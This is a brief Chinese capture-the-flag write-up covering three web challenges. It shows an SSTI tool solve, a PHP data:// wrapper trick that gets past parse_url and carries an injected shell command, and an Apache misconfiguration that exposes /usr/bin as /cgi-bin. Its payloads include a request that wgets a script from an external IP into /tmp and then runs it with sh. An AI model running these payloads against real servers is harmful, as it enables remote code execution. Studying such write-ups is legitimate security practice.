# GREETINGS
	- SSTIMap抬手秒了
- # SAFE_CONTENT
  id:: 66adf65b-9144-44e3-b41e-37b0fd38d504
	- 用`data://`伪协议构造任意内容，用`data://localhost/plain,xxx`绕过`parse_url`限制
	- payload这么构造
		- ```php
		  $f = "data://localhost/plain," . base64_encode("123; sleep 5;echo 1");
		  $s = parse_url($f);
		  var_dump($s);
		  var_dump($f);
		  var_dump(file_get_contents($f));
		  ```
	- 把payload打上去就好了
- # FUNNY
	- > 为啥这题只有几个解。。。
	- Apache配置里有这么几行
		- ```apache
		  ScriptAlias /cgi-bin /usr/bin
		  Action php-script /cgi-bin/php-cgi
		  AddHandler php-script .php
		  ```
	- 因为`/usr/bin`以`/cgi-bin`目录的形式暴露在外，所以直接访问对应目录即可启动对应程序。。。
	- payload
		- `/cgi-bin/nohup?wget+http://42.194.176.181:4052/a.txt+-O+/tmp/b.sh`
		- `/cgi-bin/nohup?sh+/tmp/b.sh`
	-